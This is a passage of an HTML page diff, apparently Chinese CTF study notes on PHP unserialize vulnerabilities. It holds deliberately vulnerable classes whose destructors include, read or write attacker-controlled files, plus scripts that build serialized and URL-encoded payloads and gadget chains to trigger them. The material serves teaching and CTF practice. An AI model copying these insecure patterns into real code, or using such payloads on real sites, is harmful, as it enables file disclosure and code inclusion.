+<td><code>__invoke</code></td>
+<td>对象当函数用</td>
+<td>少见但强</td>
+</tr>
+</tbody>
+</table>
+<hr />
+<h1 id="_12">代码参考<a class="headerlink" href="#_12" title="Permanent link">&para;</a></h1>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a><span class="cp">&lt;?php</span>
+<a id="__codelineno-5-2" name="__codelineno-5-2" href="#__codelineno-5-2"></a>
+<a id="__codelineno-5-3" name="__codelineno-5-3" href="#__codelineno-5-3"></a><span class="c1">// 1. 创建一个实例</span>
+<a id="__codelineno-5-4" name="__codelineno-5-4" href="#__codelineno-5-4"></a><span class="k">class</span> <span class="nc">wllm</span>
+<a id="__codelineno-5-5" name="__codelineno-5-5" href="#__codelineno-5-5"></a><span class="p">{</span>
+<a id="__codelineno-5-6" name="__codelineno-5-6" href="#__codelineno-5-6"></a>    <span class="k">public</span> <span class="nv">$admin</span><span class="p">;</span>
+<a id="__codelineno-5-7" name="__codelineno-5-7" href="#__codelineno-5-7"></a>    <span class="k">public</span> <span class="nv">$passwd</span><span class="p">;</span>
+<a id="__codelineno-5-8" name="__codelineno-5-8" href="#__codelineno-5-8"></a>
+<a id="__codelineno-5-9" name="__codelineno-5-9" href="#__codelineno-5-9"></a>    <span class="k">public</span> <span class="k">function</span> <span class="nf">concat</span><span class="p">(</span><span class="nv">$admin</span><span class="p">,</span> <span class="nv">$passwd</span><span class="p">)</span>
+<a id="__codelineno-5-10" name="__codelineno-5-10" href="#__codelineno-5-10"></a>    <span class="p">{</span>
+<a id="__codelineno-5-11" name="__codelineno-5-11" href="#__codelineno-5-11"></a>        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">admin</span> <span class="o">=</span> <span class="nv">$admin</span><span class="p">;</span>
+<a id="__codelineno-5-12" name="__codelineno-5-12" href="#__codelineno-5-12"></a>        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">passwd</span> <span class="o">=</span> <span class="nv">$passwd</span><span class="p">;</span>
+<a id="__codelineno-5-13" name="__codelineno-5-13" href="#__codelineno-5-13"></a>        <span class="k">return</span> <span class="nv">$admin</span> <span class="o">+</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">passwd</span><span class="p">;</span>
+<a id="__codelineno-5-14" name="__codelineno-5-14" href="#__codelineno-5-14"></a>    <span class="p">}</span>
+<a id="__codelineno-5-15" name="__codelineno-5-15" href="#__codelineno-5-15"></a>
+<a id="__codelineno-5-16" name="__codelineno-5-16" href="#__codelineno-5-16"></a>    <span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">()</span>
+<a id="__codelineno-5-17" name="__codelineno-5-17" href="#__codelineno-5-17"></a>    <span class="p">{</span>
+<a id="__codelineno-5-18" name="__codelineno-5-18" href="#__codelineno-5-18"></a>        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">admin</span> <span class="o">=</span> <span class="s2">&quot;user&quot;</span><span class="p">;</span>
+<a id="__codelineno-5-19" name="__codelineno-5-19" href="#__codelineno-5-19"></a>        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">passwd</span> <span class="o">=</span> <span class="s2">&quot;123456&quot;</span><span class="p">;</span>
+<a id="__codelineno-5-20" name="__codelineno-5-20" href="#__codelineno-5-20"></a>    <span class="p">}</span>
+<a id="__codelineno-5-21" name="__codelineno-5-21" href="#__codelineno-5-21"></a>
+<a id="__codelineno-5-22" name="__codelineno-5-22" href="#__codelineno-5-22"></a>    <span class="k">public</span> <span class="k">function</span> <span class="fm">__destruct</span><span class="p">()</span>
+<a id="__codelineno-5-23" name="__codelineno-5-23" href="#__codelineno-5-23"></a>    <span class="p">{</span>
+<a id="__codelineno-5-24" name="__codelineno-5-24" href="#__codelineno-5-24"></a>        <span class="k">if</span> <span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">admin</span> <span class="o">===</span> <span class="s2">&quot;admin&quot;</span> <span class="o">&amp;&amp;</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">passwd</span> <span class="o">===</span> <span class="s2">&quot;ctf&quot;</span><span class="p">)</span> <span class="p">{</span>
+<a id="__codelineno-5-25" name="__codelineno-5-25" href="#__codelineno-5-25"></a>            <span class="k">include</span><span class="p">(</span><span class="s2">&quot;flag.php&quot;</span><span class="p">);</span>
+<a id="__codelineno-5-26" name="__codelineno-5-26" href="#__codelineno-5-26"></a>            <span class="k">echo</span> <span class="nv">$flag</span><span class="p">;</span>
+<a id="__codelineno-5-27" name="__codelineno-5-27" href="#__codelineno-5-27"></a>        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+<a id="__codelineno-5-28" name="__codelineno-5-28" href="#__codelineno-5-28"></a>            <span class="k">echo</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">admin</span><span class="p">;</span>
+<a id="__codelineno-5-29" name="__codelineno-5-29" href="#__codelineno-5-29"></a>            <span class="k">echo</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">passwd</span><span class="p">;</span>
+<a id="__codelineno-5-30" name="__codelineno-5-30" href="#__codelineno-5-30"></a>            <span class="k">echo</span> <span class="s2">&quot;Just a bit more!&quot;</span><span class="p">;</span>
+<a id="__codelineno-5-31" name="__codelineno-5-31" href="#__codelineno-5-31"></a>        <span class="p">}</span>
+<a id="__codelineno-5-32" name="__codelineno-5-32" href="#__codelineno-5-32"></a>    <span class="p">}</span>
+<a id="__codelineno-5-33" name="__codelineno-5-33" href="#__codelineno-5-33"></a><span class="p">}</span>
+<a id="__codelineno-5-34" name="__codelineno-5-34" href="#__codelineno-5-34"></a>
+<a id="__codelineno-5-35" name="__codelineno-5-35" href="#__codelineno-5-35"></a><span class="c1">// 2. 创建对象并赋值</span>
+<a id="__codelineno-5-36" name="__codelineno-5-36" href="#__codelineno-5-36"></a><span class="nv">$exp</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">wllm</span><span class="p">();</span>
+<a id="__codelineno-5-37" name="__codelineno-5-37" href="#__codelineno-5-37"></a><span class="nv">$exp</span><span class="o">-&gt;</span><span class="na">admin</span> <span class="o">=</span> <span class="s2">&quot;admin&quot;</span><span class="p">;</span>   <span class="c1">// 赋值</span>
+<a id="__codelineno-5-38" name="__codelineno-5-38" href="#__codelineno-5-38"></a><span class="nv">$exp</span><span class="o">-&gt;</span><span class="na">passwd</span> <span class="o">=</span> <span class="s2">&quot;ctf&quot;</span><span class="p">;</span>    <span class="c1">// 赋值</span>
+<a id="__codelineno-5-39" name="__codelineno-5-39" href="#__codelineno-5-39"></a><span class="c1">// 3. 序列化并 URL 编码（直接拿去传参）</span>
+<a id="__codelineno-5-40" name="__codelineno-5-40" href="#__codelineno-5-40"></a><span class="k">echo</span> <span class="nb">urlencode</span><span class="p">(</span><span class="nb">serialize</span><span class="p">(</span><span class="nv">$exp</span><span class="p">));</span>
+<a id="__codelineno-5-41" name="__codelineno-5-41" href="#__codelineno-5-41"></a>
+<a id="__codelineno-5-42" name="__codelineno-5-42" href="#__codelineno-5-42"></a><span class="c1">#-------------------------------------------------------------------------</span>
+<a id="__codelineno-5-43" name="__codelineno-5-43" href="#__codelineno-5-43"></a><span class="k">class</span> <span class="nc">A</span>
+<a id="__codelineno-5-44" name="__codelineno-5-44" href="#__codelineno-5-44"></a><span class="p">{</span>
+<a id="__codelineno-5-45" name="__codelineno-5-45" href="#__codelineno-5-45"></a>    <span class="k">public</span> <span class="nv">$data</span><span class="p">;</span>
+<a id="__codelineno-5-46" name="__codelineno-5-46" href="#__codelineno-5-46"></a>
+<a id="__codelineno-5-47" name="__codelineno-5-47" href="#__codelineno-5-47"></a>    <span class="k">function</span> <span class="fm">__destruct</span><span class="p">()</span>
+<a id="__codelineno-5-48" name="__codelineno-5-48" href="#__codelineno-5-48"></a>    <span class="p">{</span>
+<a id="__codelineno-5-49" name="__codelineno-5-49" href="#__codelineno-5-49"></a>        <span class="k">echo</span> <span class="nb">file_get_contents</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">data</span><span class="p">);</span>
+<a id="__codelineno-5-50" name="__codelineno-5-50" href="#__codelineno-5-50"></a>    <span class="p">}</span>
+<a id="__codelineno-5-51" name="__codelineno-5-51" href="#__codelineno-5-51"></a><span class="p">}</span>
+<a id="__codelineno-5-52" name="__codelineno-5-52" href="#__codelineno-5-52"></a>
+<a id="__codelineno-5-53" name="__codelineno-5-53" href="#__codelineno-5-53"></a><span class="k">echo</span> <span class="s2">&quot;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">;</span>
+<a id="__codelineno-5-54" name="__codelineno-5-54" href="#__codelineno-5-54"></a><span class="nv">$a</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">A</span><span class="p">();</span>
+<a id="__codelineno-5-55" name="__codelineno-5-55" href="#__codelineno-5-55"></a><span class="nv">$a</span><span class="o">-&gt;</span><span class="na">data</span> <span class="o">=</span> <span class="s2">&quot;test&quot;</span><span class="p">;</span>
+<a id="__codelineno-5-56" name="__codelineno-5-56" href="#__codelineno-5-56"></a>
+<a id="__codelineno-5-57" name="__codelineno-5-57" href="#__codelineno-5-57"></a><span class="k">echo</span> <span class="nb">serialize</span><span class="p">(</span><span class="nv">$a</span><span class="p">);</span>
+<a id="__codelineno-5-58" name="__codelineno-5-58" href="#__codelineno-5-58"></a><span class="k">echo</span> <span class="s2">&quot;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">;</span>
+<a id="__codelineno-5-59" name="__codelineno-5-59" href="#__codelineno-5-59"></a>
+<a id="__codelineno-5-60" name="__codelineno-5-60" href="#__codelineno-5-60"></a><span class="c1">#-------------------------------------------------------------------------</span>
+<a id="__codelineno-5-61" name="__codelineno-5-61" href="#__codelineno-5-61"></a>
+<a id="__codelineno-5-62" name="__codelineno-5-62" href="#__codelineno-5-62"></a>
+<a id="__codelineno-5-63" name="__codelineno-5-63" href="#__codelineno-5-63"></a><span class="k">class</span> <span class="nc">Note</span>
+<a id="__codelineno-5-64" name="__codelineno-5-64" href="#__codelineno-5-64"></a><span class="p">{</span>
+<a id="__codelineno-5-65" name="__codelineno-5-65" href="#__codelineno-5-65"></a>    <span class="k">public</span> <span class="nv">$content</span><span class="p">;</span>
+<a id="__codelineno-5-66" name="__codelineno-5-66" href="#__codelineno-5-66"></a>
+<a id="__codelineno-5-67" name="__codelineno-5-67" href="#__codelineno-5-67"></a>    <span class="k">function</span> <span class="fm">__toString</span><span class="p">()</span>
+<a id="__codelineno-5-68" name="__codelineno-5-68" href="#__codelineno-5-68"></a>    <span class="p">{</span>
+<a id="__codelineno-5-69" name="__codelineno-5-69" href="#__codelineno-5-69"></a>        <span class="k">return</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">content</span><span class="p">;</span>
+<a id="__codelineno-5-70" name="__codelineno-5-70" href="#__codelineno-5-70"></a>    <span class="p">}</span>
+<a id="__codelineno-5-71" name="__codelineno-5-71" href="#__codelineno-5-71"></a><span class="p">}</span>
+<a id="__codelineno-5-72" name="__codelineno-5-72" href="#__codelineno-5-72"></a>
+<a id="__codelineno-5-73" name="__codelineno-5-73" href="#__codelineno-5-73"></a><span class="k">class</span> <span class="nc">Reader</span>
+<a id="__codelineno-5-74" name="__codelineno-5-74" href="#__codelineno-5-74"></a><span class="p">{</span>
+<a id="__codelineno-5-75" name="__codelineno-5-75" href="#__codelineno-5-75"></a>    <span class="k">public</span> <span class="nv">$note</span><span class="p">;</span>
+<a id="__codelineno-5-76" name="__codelineno-5-76" href="#__codelineno-5-76"></a>
+<a id="__codelineno-5-77" name="__codelineno-5-77" href="#__codelineno-5-77"></a>    <span class="k">function</span> <span class="fm">__destruct</span><span class="p">()</span>
+<a id="__codelineno-5-78" name="__codelineno-5-78" href="#__codelineno-5-78"></a>    <span class="p">{</span>
+<a id="__codelineno-5-79" name="__codelineno-5-79" href="#__codelineno-5-79"></a>        <span class="k">include</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">note</span><span class="p">);</span>
+<a id="__codelineno-5-80" name="__codelineno-5-80" href="#__codelineno-5-80"></a>    <span class="p">}</span>
+<a id="__codelineno-5-81" name="__codelineno-5-81" href="#__codelineno-5-81"></a><span class="p">}</span>
+<a id="__codelineno-5-82" name="__codelineno-5-82" href="#__codelineno-5-82"></a>
+<a id="__codelineno-5-83" name="__codelineno-5-83" href="#__codelineno-5-83"></a><span class="nv">$note</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Note</span><span class="p">();</span>
+<a id="__codelineno-5-84" name="__codelineno-5-84" href="#__codelineno-5-84"></a><span class="nv">$note</span><span class="o">-&gt;</span><span class="na">content</span> <span class="o">=</span> <span class="s2">&quot;flag.php&quot;</span><span class="p">;</span>
+<a id="__codelineno-5-85" name="__codelineno-5-85" href="#__codelineno-5-85"></a><span class="k">echo</span> <span class="nb">serialize</span><span class="p">(</span><span class="nv">$note</span><span class="p">);</span>
+<a id="__codelineno-5-86" name="__codelineno-5-86" href="#__codelineno-5-86"></a><span class="k">echo</span> <span class="s2">&quot;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">;</span>
+<a id="__codelineno-5-87" name="__codelineno-5-87" href="#__codelineno-5-87"></a>
+<a id="__codelineno-5-88" name="__codelineno-5-88" href="#__codelineno-5-88"></a><span class="nv">$reader</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Reader</span><span class="p">();</span>
+<a id="__codelineno-5-89" name="__codelineno-5-89" href="#__codelineno-5-89"></a><span class="nv">$reader</span><span class="o">-&gt;</span><span class="na">note</span> <span class="o">=</span> <span class="nv">$note</span><span class="p">;</span>
+<a id="__codelineno-5-90" name="__codelineno-5-90" href="#__codelineno-5-90"></a><span class="k">echo</span> <span class="nb">serialize</span><span class="p">(</span><span class="nv">$reader</span><span class="p">);</span>
+<a id="__codelineno-5-91" name="__codelineno-5-91" href="#__codelineno-5-91"></a><span class="k">echo</span> <span class="s2">&quot;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">;</span>
+<a id="__codelineno-5-92" name="__codelineno-5-92" href="#__codelineno-5-92"></a>
+<a id="__codelineno-5-93" name="__codelineno-5-93" href="#__codelineno-5-93"></a><span class="c1">#-------------------------------------------------------------------------</span>
+<a id="__codelineno-5-94" name="__codelineno-5-94" href="#__codelineno-5-94"></a>
+<a id="__codelineno-5-95" name="__codelineno-5-95" href="#__codelineno-5-95"></a><span class="k">class</span> <span class="nc">Logger</span>
+<a id="__codelineno-5-96" name="__codelineno-5-96" href="#__codelineno-5-96"></a><span class="p">{</span>
+<a id="__codelineno-5-97" name="__codelineno-5-97" href="#__codelineno-5-97"></a>    <span class="k">public</span> <span class="nv">$file</span><span class="p">;</span>
+<a id="__codelineno-5-98" name="__codelineno-5-98" href="#__codelineno-5-98"></a>
+<a id="__codelineno-5-99" name="__codelineno-5-99" href="#__codelineno-5-99"></a>    <span class="k">function</span> <span class="nf">log</span><span class="p">(</span><span class="nv">$message</span><span class="p">)</span>
+<a id="__codelineno-5-100" name="__codelineno-5-100" href="#__codelineno-5-100"></a>    <span class="p">{</span>
+<a id="__codelineno-5-101" name="__codelineno-5-101" href="#__codelineno-5-101"></a>        <span class="nb">file_put_contents</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">file</span><span class="p">,</span> <span class="nv">$message</span><span class="p">);</span>
+<a id="__codelineno-5-102" name="__codelineno-5-102" href="#__codelineno-5-102"></a>    <span class="p">}</span>
+<a id="__codelineno-5-103" name="__codelineno-5-103" href="#__codelineno-5-103"></a><span class="p">}</span>
+<a id="__codelineno-5-104" name="__codelineno-5-104" href="#__codelineno-5-104"></a>
+<a id="__codelineno-5-105" name="__codelineno-5-105" href="#__codelineno-5-105"></a><span class="k">class</span> <span class="nc">System</span>
+<a id="__codelineno-5-106" name="__codelineno-5-106" href="#__codelineno-5-106"></a><span class="p">{</span>
+<a id="__codelineno-5-107" name="__codelineno-5-107" href="#__codelineno-5-107"></a>    <span class="k">public</span> <span class="nv">$logger</span><span class="p">;</span>
+<a id="__codelineno-5-108" name="__codelineno-5-108" href="#__codelineno-5-108"></a>
+<a id="__codelineno-5-109" name="__codelineno-5-109" href="#__codelineno-5-109"></a>    <span class="k">function</span> <span class="fm">__destruct</span><span class="p">()</span>
+<a id="__codelineno-5-110" name="__codelineno-5-110" href="#__codelineno-5-110"></a>    <span class="p">{</span>
+<a id="__codelineno-5-111" name="__codelineno-5-111" href="#__codelineno-5-111"></a>        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">logger</span><span class="o">-&gt;</span><span class="na">log</span><span class="p">(</span><span class="s2">&quot;CTF!&quot;</span><span class="p">);</span>
+<a id="__codelineno-5-112" name="__codelineno-5-112" href="#__codelineno-5-112"></a>    <span class="p">}</span>
+<a id="__codelineno-5-113" name="__codelineno-5-113" href="#__codelineno-5-113"></a>
+<a id="__codelineno-5-114" name="__codelineno-5-114" href="#__codelineno-5-114"></a><span class="p">}</span>
+<a id="__codelineno-5-115" name="__codelineno-5-115" href="#__codelineno-5-115"></a>
+<a id="__codelineno-5-116" name="__codelineno-5-116" href="#__codelineno-5-116"></a><span class="nv">$logger</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Logger</span><span class="p">();</span>
+<a id="__codelineno-5-117" name="__codelineno-5-117" href="#__codelineno-5-117"></a><span class="nv">$logger</span><span class="o">-&gt;</span><span class="na">file</span> <span class="o">=</span> <span class="s2">&quot;flag.php&quot;</span><span class="p">;</span>
+<a id="__codelineno-5-118" name="__codelineno-5-118" href="#__codelineno-5-118"></a>
+<a id="__codelineno-5-119" name="__codelineno-5-119" href="#__codelineno-5-119"></a><span class="nv">$system</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">System</span><span class="p">();</span>
+<a id="__codelineno-5-120" name="__codelineno-5-120" href="#__codelineno-5-120"></a><span class="nv">$system</span><span class="o">-&gt;</span><span class="na">logger</span> <span class="o">=</span> <span class="nv">$logger</span><span class="p">;</span>
+<a id="__codelineno-5-121" name="__codelineno-5-121" href="#__codelineno-5-121"></a>
+<a id="__codelineno-5-122" name="__codelineno-5-122" href="#__codelineno-5-122"></a><span class="k">echo</span> <span class="nb">serialize</span><span class="p">(</span><span class="nv">$system</span><span class="p">);</span>
+<a id="__codelineno-5-123" name="__codelineno-5-123" href="#__codelineno-5-123"></a>
+<a id="__codelineno-5-124" name="__codelineno-5-124" href="#__codelineno-5-124"></a>
+<a id="__codelineno-5-125" name="__codelineno-5-125" href="#__codelineno-5-125"></a><span class="cp">?&gt;</span>
+</code></pre></div>
 
 
 
